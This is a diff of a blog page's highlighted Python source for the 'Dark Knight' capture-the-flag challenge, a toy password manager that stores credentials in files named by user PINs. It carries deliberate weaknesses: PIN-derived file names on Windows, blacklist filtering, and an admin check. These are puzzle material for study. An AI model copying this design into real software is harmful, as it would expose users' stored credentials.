-<pre><code>&lt;span style=&quot;color:#66d9ef&quot;&gt;with&lt;/span&gt; open(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;39671&amp;#34;&lt;/span&gt;, &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&quot;color:#66d9ef&quot;&gt;as&lt;/span&gt; f:
-    f&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;write(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;alice&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\n&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;alice1025&amp;#34;&lt;/span&gt;)
-&lt;span style=&quot;color:#66d9ef&quot;&gt;with&lt;/span&gt; open(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;683077&amp;#34;&lt;/span&gt;, &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&quot;color:#66d9ef&quot;&gt;as&lt;/span&gt; f:
-    f&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;write(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;bob&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\n&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;bob0105a&amp;#34;&lt;/span&gt;)
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>password_manager</span>():
-print(<span style=color:#e6db74>"use a short pin code to achieve fast login!!"</span>)</p><pre><code>&lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-    pin &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;enter a pin code &amp;gt; &amp;#34;&lt;/span&gt;)
 
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(pin) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
+base_dir <span style=color:#f92672>=</span> f<span style=color:#e6db74>&#34;C:</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Users</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>balsnctf</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Documents</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>Dark Knight</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>tmp-{os.urandom(16).hex()}&#34;</span>
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>init</span>():
+    os<span style=color:#f92672>.</span>mkdir(base_dir)
+    os<span style=color:#f92672>.</span>chdir(base_dir)
+
+    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;39671&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+        f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;alice</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>alice1025&#34;</span>)
+    <span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;683077&#34;</span>, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+        f<span style=color:#f92672>.</span>write(<span style=color:#e6db74>&#34;bob</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>bob0105a&#34;</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>password_manager</span>():
+    print(<span style=color:#e6db74>&#34;use a short pin code to achieve fast login!!&#34;</span>)
+
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        pin <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter a pin code &gt; &#34;</span>)
+
+        <span style=color:#66d9ef>if</span> len(pin) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+        
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>in</span> pin <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>in</span> pin <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>in</span> pin <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;*&#34;</span> <span style=color:#f92672>in</span> pin:
+            print(<span style=color:#e6db74>&#34;what do you want to do?(¬_¬)&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+
+        flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> pin<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf8&#34;</span>):
+            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x7e</span> <span style=color:#f92672>or</span> c <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x20</span>:
+                print(<span style=color:#e6db74>&#34;printable chars only!!&#34;</span>)
+                flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+                <span style=color:#66d9ef>break</span>
+        
+        <span style=color:#66d9ef>if</span> flag:
+            <span style=color:#66d9ef>break</span>
     
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\\&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;..&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;*&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;what do you want to do?(¬_¬)&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        username <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter username &gt; &#34;</span>)
 
-    flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;for&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;encode(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;):
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x7e&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x20&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;printable chars only!!&amp;#34;&lt;/span&gt;)
-            flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+        <span style=color:#66d9ef>if</span> len(username) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> username<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf8&#34;</span>):
+            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x7e</span> <span style=color:#f92672>or</span> c <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x20</span>:
+                print(<span style=color:#e6db74>&#34;printable chars only!!&#34;</span>)
+                flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+                <span style=color:#66d9ef>break</span>
+        
+        <span style=color:#66d9ef>if</span> flag:
+            <span style=color:#66d9ef>break</span>
     
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; flag:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        password <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter password &gt; &#34;</span>)
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-    username &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;enter username &amp;gt; &amp;#34;&lt;/span&gt;)
+        <span style=color:#66d9ef>if</span> len(password) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> password<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf8&#34;</span>):
+            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x7e</span> <span style=color:#f92672>or</span> c <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x20</span>:
+                print(<span style=color:#e6db74>&#34;printable chars only!!&#34;</span>)
+                flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+                <span style=color:#66d9ef>break</span>
+        
+        <span style=color:#66d9ef>if</span> flag:
+            <span style=color:#66d9ef>break</span>
 
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(username) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;for&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; username&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;encode(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;):
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x7e&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x20&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;printable chars only!!&amp;#34;&lt;/span&gt;)
-            flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+    <span style=color:#66d9ef>try</span>:
+        <span style=color:#66d9ef>with</span> open(pin, <span style=color:#e6db74>&#34;w&#34;</span>) <span style=color:#66d9ef>as</span> f:
+            f<span style=color:#f92672>.</span>write(username <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>+</span> password)
+        
+        print(<span style=color:#e6db74>&#34;saved!!&#34;</span>)
+    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>OSError</span>:
+        print(<span style=color:#e6db74>&#34;pin is invalid!!&#34;</span>)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safety_guard</span>():
+    print(<span style=color:#e6db74>&#34;safety guard activated. will delete all unsafe credentials hahaha...&#34;</span>)
+    delete_file <span style=color:#f92672>=</span> []
+    <span style=color:#66d9ef>for</span> pin <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>listdir(<span style=color:#e6db74>&#34;.&#34;</span>):
+        safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+        <span style=color:#66d9ef>with</span> open(pin, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
+            data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+            <span style=color:#66d9ef>if</span> len(data) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
+                safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+            <span style=color:#66d9ef>elif</span> len(data[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>or</span> len(data[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
+                safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+            <span style=color:#66d9ef>elif</span> data[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span> <span style=color:#f92672>or</span> data[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
+                safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+            <span style=color:#66d9ef>elif</span> data[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>:
+                safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+
+        <span style=color:#66d9ef>if</span> safe <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
+            os<span style=color:#f92672>.</span>remove(pin)
+            delete_file<span style=color:#f92672>.</span>append(pin)
     
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; flag:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+    print(f<span style=color:#e6db74>&#34;finished. delete {len(delete_file)} unsafe credentials: </span><span style=color:#e6db74>{delete_file}</span><span style=color:#e6db74>&#34;</span>)
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;while&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;:
-    password &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; input(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;enter password &amp;gt; &amp;#34;&lt;/span&gt;)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fast_login</span>():
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        pin <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter a pin code &gt; &#34;</span>)
 
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(password) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;for&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; password&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;encode(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;):
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x7e&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x20&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;printable chars only!!&amp;#34;&lt;/span&gt;)
-            flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;
-            &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+        <span style=color:#66d9ef>if</span> len(pin) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+        
+        <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>in</span> pin <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;/&#34;</span> <span style=color:#f92672>in</span> pin <span style=color:#f92672>or</span> <span style=color:#e6db74>&#34;..&#34;</span> <span style=color:#f92672>in</span> pin:
+            print(<span style=color:#e6db74>&#34;what do you want to do?(¬_¬)&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+
+        flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
+        <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> pin<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#34;utf8&#34;</span>):
+            <span style=color:#66d9ef>if</span> c <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x7e</span> <span style=color:#f92672>or</span> c <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x20</span>:
+                print(<span style=color:#e6db74>&#34;printable chars only!!&#34;</span>)
+                flag <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
+                <span style=color:#66d9ef>break</span>
+        
+        <span style=color:#66d9ef>if</span> flag:
+            <span style=color:#66d9ef>break</span>
     
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; flag:
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;break&lt;/span&gt;
+    <span style=color:#66d9ef>try</span>:
+        <span style=color:#66d9ef>with</span> open(pin, <span style=color:#e6db74>&#34;r&#34;</span>) <span style=color:#66d9ef>as</span> f:
+            data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+            <span style=color:#66d9ef>if</span> len(data) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
+                print(<span style=color:#e6db74>&#34;unknown error happened??&#34;</span>)
+                <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>
+            <span style=color:#66d9ef>return</span> data[<span style=color:#ae81ff>0</span>], data[<span style=color:#ae81ff>1</span>]
+    <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>FileNotFoundError</span>:
+        print(<span style=color:#e6db74>&#34;this pin code is not registered.&#34;</span>)
+        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>, <span style=color:#66d9ef>None</span>
 
-&lt;span style=&quot;color:#66d9ef&quot;&gt;try&lt;/span&gt;:
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;with&lt;/span&gt; open(pin, &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;) &lt;span style=&quot;color:#66d9ef&quot;&gt;as&lt;/span&gt; f:
-        f&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;write(username &lt;span style=&quot;color:#f92672&quot;&gt;+&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\n&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;+&lt;/span&gt; password)
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>normal_login</span>():
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        username <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter username &gt; &#34;</span>)
+
+        <span style=color:#66d9ef>if</span> len(username) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+        <span style=color:#66d9ef>elif</span> username<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
+            print(<span style=color:#e6db74>&#34;strange username, huh?&#34;</span>)
+        <span style=color:#66d9ef>elif</span> username <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;admin&#34;</span>:
+            print(<span style=color:#e6db74>&#34;no you are definitely not (╬ Ò ‸ Ó)&#34;</span>)
+        <span style=color:#66d9ef>else</span>:
+            <span style=color:#66d9ef>break</span>
     
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;saved!!&amp;#34;&lt;/span&gt;)
-&lt;span style=&quot;color:#66d9ef&quot;&gt;except&lt;/span&gt; &lt;span style=&quot;color:#a6e22e&quot;&gt;OSError&lt;/span&gt;:
-    print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;pin is invalid!!&amp;#34;&lt;/span&gt;)
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>safety_guard</span>():
-print(<span style=color:#e6db74>"safety guard activated. will delete all unsafe credentials hahaha&mldr;"</span>)
-delete_file <span style=color:#f92672>=</span> []
-<span style=color:#66d9ef>for</span> pin <span style=color:#f92672>in</span> os<span style=color:#f92672>.</span>listdir(<span style=color:#e6db74>"."</span>):
-safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>
-<span style=color:#66d9ef>with</span> open(pin, <span style=color:#e6db74>"r"</span>) <span style=color:#66d9ef>as</span> f:
-data <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>"</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>"</span>)
-<span style=color:#66d9ef>if</span> len(data) <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span>:
-safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
-<span style=color:#66d9ef>elif</span> len(data[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>or</span> len(data[<span style=color:#ae81ff>1</span>]) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
-safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
-<span style=color:#66d9ef>elif</span> data[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span> <span style=color:#f92672>or</span> data[<span style=color:#ae81ff>1</span>]<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
-safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
-<span style=color:#66d9ef>elif</span> data[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>"admin"</span>:
-safe <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span></p><pre><code>    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; safe &lt;span style=&quot;color:#f92672&quot;&gt;==&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;False&lt;/span&gt;:
-        os&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;remove(pin)
-        delete_file&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;append(pin)
+    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+        password <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;enter password &gt; &#34;</span>)
 
-print(f&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;finished. delete {len(delete_file)} unsafe credentials: &lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;{delete_file}&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;)
-</code></pre><p><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fast_login</span>():
-<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
-pin <span style=color:#f92672>=</span> input(<span style=color:#e6db74>"enter a pin code > "</span>)</p><pre><code>    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; len(pin) &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;100&lt;/span&gt;:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;too long...&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
+        <span style=color:#66d9ef>if</span> len(password) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>100</span>:
+            print(<span style=color:#e6db74>&#34;too long...&#34;</span>)
+            <span style=color:#66d9ef>continue</span>
+        <span style=color:#66d9ef>elif</span> password<span style=color:#f92672>.</span>isalnum() <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
+            print(<span style=color:#e6db74>&#34;strange password, huh?&#34;</span>)
+        <span style=color:#66d9ef>else</span>:
+            <span style=color:#66d9ef>break</span>
     
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&quot;color:#ae81ff&quot;&gt;\\&lt;/span&gt;&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; &lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;..&amp;#34;&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin:
-        print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;what do you want to do?(¬_¬)&amp;#34;&lt;/span&gt;)
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;continue&lt;/span&gt;
+    <span style=color:#66d9ef>return</span> username, password
 
-    flag &lt;span style=&quot;color:#f92672&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#66d9ef&quot;&gt;True&lt;/span&gt;
-    &lt;span style=&quot;color:#66d9ef&quot;&gt;for&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;in&lt;/span&gt; pin&lt;span style=&quot;color:#f92672&quot;&gt;.&lt;/span&gt;encode(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;utf8&amp;#34;&lt;/span&gt;):
-        &lt;span style=&quot;color:#66d9ef&quot;&gt;if&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x7e&lt;/span&gt; &lt;span style=&quot;color:#f92672&quot;&gt;or&lt;/span&gt; c &lt;span style=&quot;color:#f92672&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&quot;color:#ae81ff&quot;&gt;0x20&lt;/span&gt;:
-            print(&lt;span style=&quot;color:#e6db74&quot;&gt;&amp;#34;printable chars only!!&amp;#34;&lt;/span&gt;)
